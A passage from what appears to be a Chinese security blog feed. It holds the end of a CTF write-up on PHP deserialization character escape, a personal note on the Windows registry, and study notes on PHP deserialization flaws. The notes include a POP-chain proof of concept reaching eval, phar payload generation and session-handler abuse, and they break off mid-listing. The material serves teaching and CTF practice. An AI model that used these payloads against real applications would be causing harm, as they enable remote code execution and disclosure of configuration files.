<span class="token function">preg_match</span><span class="token punctuation">(</span>pattern<span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token boolean constant">false</span>
<span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"abc"</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token constant">null</span>
<span class="token function">strpos</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"abc"</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token constant">null</span></code></pre>
</blockquote>
<p>因此，可以把<code>nickname</code>设置为数组格式，并构造<code>payload</code>，即可得到<code>flag</code></p>
<p>将序列化的前文闭合并定义<code>photo</code>为<code>config.php</code>的序列化字符串为<code>;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>，总计<code>34</code>个字符，所以需要<code>34</code>个<code>where</code>被替换为<code>hacker</code>，因此payload为：</p>
<blockquote>
<p>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere”;}s:5:”photo”;s:10:”config.php”;}</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210517153846.png" alt="image-20210517153846421" loading="lazy"></p>
<p>访问<code>profile.php</code>后得到：</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210517154015.png" alt="image-20210517154015038" loading="lazy"></p>
<p><code>base64</code>解码即可得到<code>flag</code>：</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210517154056.png" alt="image-20210517154056911" loading="lazy"></p>
<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p>[1] [安洵杯 2019]easy_serialize_php WP <a href="https://www.jianshu.com/p/8e8117f9fd0e">https://www.jianshu.com/p/8e8117f9fd0e</a></p>
<p>[2] PHP反序列化 — 字符逃逸 <a href="https://xz.aliyun.com/t/9213">https://xz.aliyun.com/t/9213</a></p>
<p>[3] [0CTF 2016]piapiapia解题详细思路及复现 <a href="https://www.cnblogs.com/g0udan/p/12216207.html">https://www.cnblogs.com/g0udan/p/12216207.html</a></p>
<p>[4] 利用数组绕过问题小总结 <a href="https://www.jianshu.com/p/8e3b9d056da6?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation">https://www.jianshu.com/p/8e3b9d056da6?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>注册表详解</title>
    <url>/2020/12/23/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h4 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 起因"></a>0x00 起因</h4><p>事情的起因是这样的：</p>
<p>​    前两天，在使用丝滑的Microsoft Office后。我把目光投向了电脑中的WPS，不由得怒从心头起，恶向胆边生，没错！我决定将WPS换成Microsoft Office。虽然WPS苦苦挽留我（<del>指无法卸载干净</del>），但我岂是那种与前任藕断丝连的人？于是直接网上寻找如何干净利落的卸载WPS，然后照着点赞最多的答案开始操作。</p>
<p>​    按照点赞最多的回答，需要删除WPS留存在电脑中的注册表，即删除注册表的office文件夹。我啪的一下，直接删除，很快啊，心想着就能美滋滋用上Microsoft Office了。但是，当我打开[开始菜单]，发现我的快捷方式一多半都没了，立刻意识刚刚删的注册表中的office文件夹还有其他东西，我大意了啊。</p>
<p>​    但是注册表又不能Ctrl+Z撤销，所以我只能再次查查有没有什么方法恢复注册表，很快啊，我又再次发现注册表是会自动备份的，所以可以将注册表的备份恢复回去（我感觉我又可以了）</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20201223201721.png" alt="image-20201223201721686" loading="lazy"></p>
<p>​    我打开备份文件夹一看，空的？！我想起前两天C盘空间紧张，我就把一些系统备份文件删掉了，我他喵怎么就这么手欠呢？所以最终的解决办法：按住回去给那个解决方案点踩的冲动，重新把快捷方式一个一个粘回去。</p>
<p>​    因此，本着”人不能在同一地方跌倒两次”的想法，我怀着悲伤的心情学习了注册表。</p>
<p>（Q:下次还敢吗？A:我错了QAQ，下次备好份再干，欸嘿~）</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20201223202835.png" alt="image-20201223202835836" loading="lazy"></p>
<h4 id="0x01-注册表概述"><a href="#0x01-注册表概述" class="headerlink" title="0x01 注册表概述"></a>0x01 注册表概述</h4><p>注册表记录了用户安装在计算机上的软件和<strong>每个程序的相互关联信息</strong>，它包括了计算机的硬件配置，包括自动配置的即插即用的设备和已有的各种设备说明、状态属性以及各种状态信息和数据。利用一个功能强大的注册表数据库来统一集中地管理系统硬件设施、软件配置等信息，从而方便了管理，增强了系统的稳定性。</p>
<p>也就是说：<code>注册表是Windows操作系统的一个管理程序信息的数据库</code></p>
<h4 id="0x02-注册表里的数据表示什么"><a href="#0x02-注册表里的数据表示什么" class="headerlink" title="0x02 注册表里的数据表示什么"></a>0x02 注册表里的数据表示什么</h4><p>当我们打开注册表，首先可以看见：这5个文件夹成为<strong>根键</strong></p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20201223203654.png" alt="image-20201223203654899" loading="lazy"></p>
<p>含义是这样的：</p>
<blockquote>
<p>HKEY_CLASSES_ROOT：启动应用程序所需的全部信息，包括扩展名，应用程序与文档之间的关系，驱动程序名，DDE和OLE信息，类ID编号和应用程序与文档的图标等。<br>HKEY_CURRENT_USER：当前登录用户的配置信息，包括环境变量，个人程序以及桌面设置等<br>HKEY_LOCAL_MACHINE：该根键包括本地计算机的系统信息，包括硬件和操作系统信息，安全数据和计算机专用的各类软件设置信息<br>HKEY_USERS：该根键包括计算机的所有用户使用的配置数据，这些数据只有在用户登录系统时才能访问。这些信息告诉系统当前用户使用的图标，激活的程序组，开始菜单的内容以及颜色，字体<br>HKEY_CURRENT_CONFIG：常被用户改变的部分硬件软件配置，其中的信息是从HKEY_LOCAL_MACHINE中映射出来的</p>
</blockquote>
<h4 id="0x03-注册表里的子项表示什么"><a href="#0x03-注册表里的子项表示什么" class="headerlink" title="0x03 注册表里的子项表示什么"></a>0x03 注册表里的子项表示什么</h4><p>在根键下面有一堆的文件夹，称为子项，接下来是各种子项的含义：</p>
<blockquote>
<p>HKEY_CLASSES_ROOT子项：<br>打开时会发现一长串子项<br>分为两种：已注册的各类文件拓展名、各种文件类型的有关信息</p>
<p>HKEY_CURRENT_USER子项：<br>此根键中保存的信息（当前用户的子项信息）与HKEY_USERS_DEFAULT下面的一模一样的。任何对 HKEY_CURRENT_USER根键中的信息的修改都会导致对HKEY_USERS_DEFAULT中子项的修改</p>
<p>HKEY_LOCAL_MACHINE子项：<br>存放的是用来控制系统和软件的设置。包含的子项有：<br>HARDWARE：系统使用的浮点处理器、串口等信息<br>SECURITY：为将来的高级功能而预留<br>SOFTWARE：所有已安装的应用程序的信息，各个程序的控制信息分别安装在相应的子项中（刚刚大意删除的office子项就在里面）<br>SYSTEM：该子项是启动时所需的信息和修复系统时所需要的信息</p>
<p>HKEY_USERS子项：<br>存放默认用户、当前登录用户和软件的信息，其中DEFAULT子项是其中最重要的，它的配置是针对未来将会被创建的新用户的。新用户根据默认用户的配置信息来生成自己的配置文件，该配置文件包括环境、屏幕和声音等多种信息</p>
<p>HKEY_CURRENT_CONFIG子项：<br>常被用户改变的部分硬件软件配置</p>
</blockquote>
<h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>​    经过一通对注册表的学习之后，我发现一件很严肃的事情：</p>
<p>​    我删除的应该是HKEY_LOCAL_MACHINE\SOFTWARE\kingsoft下的office文件夹，而开始屏幕中的内容应该会属于HKEY_USERS，这俩应该八竿子打不着才对，难道是因为某些别的误操作才导致我的开始屏幕的快捷方式谜之消失的？</p>
<h4 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h4><p>[1] Windows注册表内容详解 <a href="https://www.jianshu.com/p/0cfcbba813ac">https://www.jianshu.com/p/0cfcbba813ac</a></p>
<p>[2] Windows注册表超级详解 <a href="http://pc.kutx.cn/pc/pc11637.htm">http://pc.kutx.cn/pc/pc11637.htm</a></p>
<p>[3] windows注册表详解 <a href="https://blog.csdn.net/dpsying/article/details/46907891">https://blog.csdn.net/dpsying/article/details/46907891</a></p>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>计算机</tag>
        <tag>系统</tag>
        <tag>注册表</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化漏洞学习笔记（一）—— 反序列化漏洞原理</title>
    <url>/2021/04/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h3 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h3><h4 id="1-1-序列化与反序列化"><a href="#1-1-序列化与反序列化" class="headerlink" title="1.1 序列化与反序列化"></a>1.1 序列化与反序列化</h4><p><strong>序列化</strong>是<font color=red><code>将一个对象压缩成一个字符串的方法</code></font>，可以将对象的状态信息转化为可以存储或传输的形式。</p>
<p><strong>举个栗子</strong>：此处代码来源于[1]</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">userInfo</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'weak'</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'male'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'ama666'</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">modifyPasswd</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">passwd</span> <span class="token operator">=</span> <span class="token variable">$passwd</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getPasswd</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$passwd</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$ama666</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">userInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$ama666</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">modifyPasswd</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'strong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$ama666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>输出结果为：</p>
<blockquote>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"userInfo"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"userInfopasswd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"strong"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"*sex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"male"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"ama666"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>

<span class="token shell-comment comment"># 含义如下：</span>
<span class="token shell-comment comment"># ' O:8:"userInfo":3: ' : 该Object名字为字符长度为8的"userInfo"，有三个属性</span>
<span class="token shell-comment comment"># 大括号内的内容是属性的名字、名字的字符长度、值和其他信息</span>
<span class="token shell-comment comment"># 针对不同权限的属性，表示方式也不同：private前添加对象名（userInfo）</span>
<span class="token shell-comment comment">#                               protected前添加星号（*）</span>
<span class="token shell-comment comment">#                               public没有前缀</span></code></pre>
</blockquote>
<p>因此，一个对象序列化之后，字符中也就只有对象名、对象的属性键值对，并不包含方法</p>
<p><font color=red><code>注：private属性在序列化的时候还包含空字节，所以一般要编码操作</code></font></p>
<p><strong>反序列化</strong>是将序列化后的字符串”解压缩”成对象的过程。</p>
<p><strong>但是</strong>，当这个字符串被还原的时候，并不会包含任何方法。因此，反序列化的对象想要使用原先的方法必须依托于<strong>域</strong>，脱离了原本的域，反序列的对象无法使用之前的方法。</p>
<h4 id="1-2-PHP魔术方法利用"><a href="#1-2-PHP魔术方法利用" class="headerlink" title="1.2 PHP魔术方法利用"></a>1.2 PHP魔术方法利用</h4><p>在PHP中，有一些魔术方法，在特定条件下，会自动触发，如果这些函数中不幸<del>(nice)</del>存在一些可利用的函数，就可以进行下一步攻击。16个魔法函数如下：</p>
<blockquote>
<ul>
<li>_autoload() : 当使用未定义的类时，自动调用该函数（7.2.0版本被弃用）</li>
<li>__call() : 调用未定义或不可访问的方法时自动调用</li>
<li>__callStatic() : 调用类的一个不存在的静态方法 ( 不存在或该方法不可访问 ) 时自动调用</li>
<li>__clone() : PHP 对象的拷贝完成后，自动调用该方法（注意PHP的拷贝是浅拷贝）</li>
<li>__construct() : 构造函数，此函数会在创建一个类的实例时自动调用</li>
<li>__debugInfo() : 用于定制对象的 <code>var_dump()</code> 输出结果，调用<code>var_dump()</code> 时自动调用</li>
<li>__destruct() : 对象的所有引用都被删除或者类被销毁的时候自动调用，程序结束也会自动调用析构函数</li>
<li>__get() : 读取不存在或不可访问的属性值的时候，此魔法函数会自动调用</li>
<li>__invoke() : 会在将一个对象当作一个方法来使用时会自动调用</li>
<li>__isset() : 判断属性是否定义时，若属性私有或未定义，则自动调用</li>
<li>__set() : 给类的实例的不存在的属性或不可访问的属性赋值</li>
<li>__set_state() :  用<code>var_export()</code>输出一个对象时，会自动调用</li>
<li>__sleep() : 进行序列化的时候，先调用此函数，用于定制序列化结果，剔除无需序列化的属性</li>
<li>__toString() : 对象被当作字符串格式处理时会自动触发，需要此函数中的功能语句将对象转化为字符串，该函数必须要有一个字符串格式的返回值</li>
<li>__unset() : 销毁私有属性或不存在的属性时会自动调用</li>
<li>__wakeup() : 进行反序列化的时候，先调用此函数</li>
</ul>
</blockquote>
<p><font color=red><code>注：所有魔法函数必须声明为public</code></font></p>
<h4 id="1-3-普通成员方法利用"><a href="#1-3-普通成员方法利用" class="headerlink" title="1.3 普通成员方法利用"></a>1.3 普通成员方法利用</h4><p>寻找相同的同名方法，将敏感函数和类联系在一起。</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">chybeta</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ph0en1x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">ph0en1x</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"ph0en1x"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">ph0en2x</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> <span class="token variable">$test2</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$class6</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">chybeta</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>例如上文中的代码：</p>
<p>析构函数中调用了对象的<code>action()</code>方法，而<code>ph0en1x</code>类和<code>ph0en2x</code>类中均含有<code>action()</code>方法，所以，若在构造序列化的时候将<code>test</code>属性设置为<code>ph0en2x</code>对象，则可以使用<code>ph0en2x</code>中的<code>eval()</code>函数执行自定义的<code>PHP</code>语句。</p>
<p>POC如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">chybeta</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ph0en2x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">ph0en2x</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> <span class="token variable">$test2</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"phpinfo();"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">chybeta</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<h4 id="1-4-反序列化字符逃逸"><a href="#1-4-反序列化字符逃逸" class="headerlink" title="1.4 反序列化字符逃逸"></a>1.4 反序列化字符逃逸</h4><p>PHP反序列化字符逃逸依靠PHP在反序列化时的几个特性：</p>
<blockquote>
<ul>
<li><p>对类中不存在的属性也会反序列化</p>
</li>
<li><p>在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且根据长度判断内容</p>
<p>例：正常的反序列化可执行<code>a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;</code></p>
<p>执行<code>a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;i:1;s:5:&quot;aaaaa&quot;;</code>仍可得到相同结果</p>
</li>
</ul>
</blockquote>
<p>所以当碰到PHP对反序列化的字符串进行替换、删除等改变字符长度的操作时，可以构造<code>payload</code>使得替换后的字符串仍能正常反序列化，并反序列化为自定义的内容</p>
<h4 id="1-5-phar反序列化"><a href="#1-5-phar反序列化" class="headerlink" title="1.5 phar反序列化"></a>1.5 phar反序列化</h4><p><code>phar://</code>是<code>PHP</code>解压压缩包的一个函数，不管什么，都会当做压缩包来解压，当使用该伪协议读取<code>phar</code>文件时，会自动将文件中的<code>meta-data</code>部分反序列化</p>
<p>在真实情况，需要将构造好的<code>phar</code>文件上传到目标服务器，然后利用<code>phar</code>在解压时会反序化<code>meta-data</code>部分来达到目的</p>
<p><code>phar</code>文件生成如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">&#123;</span>

    <span class="token punctuation">&#125;</span>
    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'GIF89a'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//设置stub，增加gif文件头</span>
    <span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'test.txt'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//添加要压缩的文件</span>
    <span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$object</span> <span class="token operator">-</span><span class="token operator">></span> data <span class="token operator">=</span> <span class="token single-quoted-string string">'Lmg'</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//将自定义meta-data存入manifest</span>
    <span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>注意测试的时候要将<code>php.ini</code>的<code>phar.readonly</code>参数设置为<code>off</code>：</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210525160442.png" alt="image-20210525160435845" loading="lazy"></p>
<blockquote>
<p>利用条件：</p>
<ul>
<li>phar文件要能上传</li>
<li>有可利用函数如上图，可魔法函数构造pop链</li>
<li>文件函数操作可控，: / phar 等没过被过滤</li>
</ul>
</blockquote>
<h4 id="1-6-SESSION反序列化"><a href="#1-6-SESSION反序列化" class="headerlink" title="1.6 SESSION反序列化"></a>1.6 SESSION反序列化</h4><p><code>session</code>用于跟踪用户的行为，保存用户的信息和状态等等。服务器创建一个<code>sessionid</code>命名的文件，用于保存这个用户的会话信息。</p>
<p>当会话开始或通过<code>session_start()</code>开始时，<code>php</code>内部会通过传来的<code>sessionid</code>来读取文件，<code>php</code>会自动序列化<code>session</code>文件内容，并将其填充到超全局变量<code>$_SESSION</code>中。如果不存在对应的会话数据，则创建一个<code>sessionid</code>的文件。</p>
<blockquote>
<p>常见session存储位置：</p>
<p>/var/lib/php5/sess_PHPSESSID</p>
<p>/var/lib/php7/sess_PHPSESSID</p>
<p>/var/lib/php/sess_PHPSESSID </p>
<p>/tmp/sess_PHPSESSID </p>
<p>/tmp/sessions/sess_PHPSESSED</p>
</blockquote>
<p>session的<strong>存储机制</strong>：</p>
<table>
<thead>
<tr>
<th>机制</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名+竖线+serialize函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名长度对应的ASCII字符+键名+serialize函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>serialize函数序列化处理的值</td>
</tr>
</tbody></table>
<p>例如：</p>
<blockquote>
<ul>
<li>Lmg|s:3:”123”; ————————-ini_set(‘session.serialize_handler’, ‘php’); php机制</li>
<li>Lmgs:3:”123”; ————————ini_set(“session.serialize_handler”, “php_binary”); php_binary机制</li>
<li>a:1:{s:3:”Lmg”;s:3:”123”;} ———–ini_set(“session.serialize_handler”, “php_serialize”); php_serialize机制</li>
</ul>
</blockquote>
<p><code>产生session反序列的原因就在程序员在读取或者存储中使用了不同的机制</code></p>
<p>举个栗子：假如存储时使用<code>php_serialize</code>机制，而读取时使用了<code>php</code>机制，那么存储时看似正常的竖线则会在读取时变为分隔符</p>
<blockquote>
<p>存储的内容：a:1:{s:3:”Lmg”;s:60:”|O:7:”student”:2:{s:4:”name”;s:4:”hack”;s:3:”age”;s:2:”19”;}</p>
<p>读取的内容（竖线前的内容被看作变量名）：O:7:”student”:2:{s:4:”name”;s:4:”hack”;s:3:”age”;s:2:”19”;}</p>
</blockquote>
<p><strong>没有$_SESSION赋值的session反序列化：</strong></p>
<p>在<code>php</code>中存在一个<code>upload_process</code>机制，可以自动创建<code>$_SESSION</code>一个键值对，而且其中的值用户可以控制，文件上传时应用可以发送一个POST请求到终端来检查这个状态</p>
<p>在上传文件时，<code>post</code>一个于<code>session.upload_process.name</code>同名的变量。后端就会自动将<code>post</code>的这个同名变量作为键，进行序列化然后存储到<code>session</code>文件中</p>
<h3 id="0x02-BUUCTF-网鼎杯-2020-青龙组-AreUSerialz"><a href="#0x02-BUUCTF-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="0x02 BUUCTF-[网鼎杯 2020 青龙组]AreUSerialz"></a>0x02 BUUCTF-[网鼎杯 2020 青龙组]AreUSerialz</h3><h4 id="2-1-源码分析"><a href="#2-1-源码分析" class="headerlink" title="2.1 源码分析"></a>2.1 源码分析</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Hello World!"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
